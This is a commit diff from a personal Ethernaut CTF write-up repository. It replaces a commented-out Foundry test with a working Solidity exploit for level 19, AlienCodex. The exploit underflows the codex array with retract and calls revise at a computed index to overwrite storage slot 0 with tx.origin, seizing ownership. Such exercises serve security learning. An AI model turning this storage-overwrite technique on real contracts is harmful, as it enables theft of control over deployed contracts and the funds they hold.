9f1f103935effd54d15be731f683b3b64e81220e
0xbc000 <70671338+0xbc000@users.noreply.github.com>
2024-09-12 14:32:10 +0800

    Update ethernautlv19.sol

--- Writeup/BillyC/ethernaut/test/ethernautlv19.sol
+++ Writeup/BillyC/ethernaut/test/ethernautlv19.sol
@@ -1,36 +1,24 @@
-// // SPDX-License-Identifier: UNLICENSED
-// pragma solidity ^0.8.0;
+pragma solidity ^0.8.0;
 
-// import "forge-std/Test.sol";
+interface IAlienCodex {
+    function revise(uint i, bytes32 _content) external;
+    function makeContact() external;
+    function retract() external;
+}
 
-// // import "../src/levels/19-AlienCodex/AlienCodex.sol";
-
-// // [NOTE] Simply poc, cannot work on foundry since version issue
-// contract ContractTest is Test {
-//     // cast storage 0xb385aCa71ace780e814144b783CB5c121b460668 1 --rpc-url https://rpc.ankr.com/eth_sepolia
-//     AlienCodex level19 =
-//         AlienCodex(payable(0xb385aCa71ace780e814144b783CB5c121b460668));
-
-//     function setUp() public {
-//         Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
-//         vm.createSelectFork(vm.rpcUrl("sepolia"));
-
-//         vm.label(address(this), "Attacker");
-//         vm.label(
-//             address(0xb385aCa71ace780e814144b783CB5c121b460668),
-//             "Ethernaut19"
-//         );
-//     }
-
-//     function testEthernaut19() public {
-//         level19.makeContact();
-//         unchecked {
-//             uint256 index_zero = (2 ** 256 - 1 - uint256(keccack256(1)) + 1);
-//             console.log(index_zero);
-//             level19.revise(index_zero, address(this));
-//         }
-//         bytes32 myKey = vm.load(address(level19), bytes32(uint256(0)));
-//     }
-
-//     receive() external payable {}
-// }
+contract AlienCodex {
+    address level19;
+    
+    constructor(address _levelInstance) {
+      level19 = _levelInstance;
+    }
+    
+    function trigger () external {
+        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
+        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
+        IAlienCodex(level19).makeContact();
+        IAlienCodex(level19).retract();
+        IAlienCodex(level19).revise(index, myAddress);
+    }
+}
+// Works only in Remix, the foundry cannot work with the old version of the src contract from my env
